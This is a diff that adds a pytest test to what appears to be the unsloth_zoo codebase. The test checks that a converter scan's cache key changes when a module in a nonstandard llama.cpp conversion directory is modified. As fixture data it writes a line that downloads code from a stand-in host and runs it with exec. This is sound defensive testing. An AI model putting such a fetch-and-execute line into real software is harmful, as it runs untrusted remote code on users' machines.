@@ -2167,6 +2167,40 @@ def test_a_top_level_symlink_does_not_become_its_own_purge_boundary(
     assert theirs.exists(), "the per-location purge reached outside the checkout"
 
 
+def test_a_conversion_dir_without_base_py_is_still_keyed(tmp_path, monkeypatch):
+    """The key gated conversion/ on the package layout (__init__.py AND base.py),
+    but the scan reads the directory either way, because the converter can import
+    from it either way. A conversion/ without base.py was therefore scanned once
+    and recorded as an empty header with no digests, so after the first export a
+    changed module left the key identical, the patcher came back from cache, and
+    the subprocess imported the new bytes unscanned.
+    """
+    llama_cpp = _load("llama_cpp_odd_layout_key_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = tmp_path / "llama.cpp"
+    conversion = root / "conversion"
+    conversion.mkdir(parents = True)
+    (conversion / "__init__.py").write_text("from . import helper\n", encoding = "utf-8")
+    (conversion / "helper.py").write_text("X = 1\n", encoding = "utf-8")
+    assert not (conversion / "base.py").exists(), "the point of this layout"
+    # Still a scan location, which is what makes the missing key entries a hole.
+    assert any(
+        location.label == "conversion"
+        for location in llama_cpp._scanned_locations(str(root)).locations
+    )
+
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    before = llama_cpp._conversion_sibling_info(str(root))
+    (conversion / "helper.py").write_text(
+        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
+        encoding = "utf-8",
+    )
+    after = llama_cpp._conversion_sibling_info(str(root))
+    assert before != after, (
+        "the key did not move when a module in a nonstandard conversion/ changed"
+    )
+
+
 def test_a_pins_bytecode_travels_in_the_patcher_cache_key(tmp_path, monkeypatch):
     """A pin's caches are deliberately left in place, so they are part of what the
     converter subprocess executes. Left out of the key, a cache changed after the
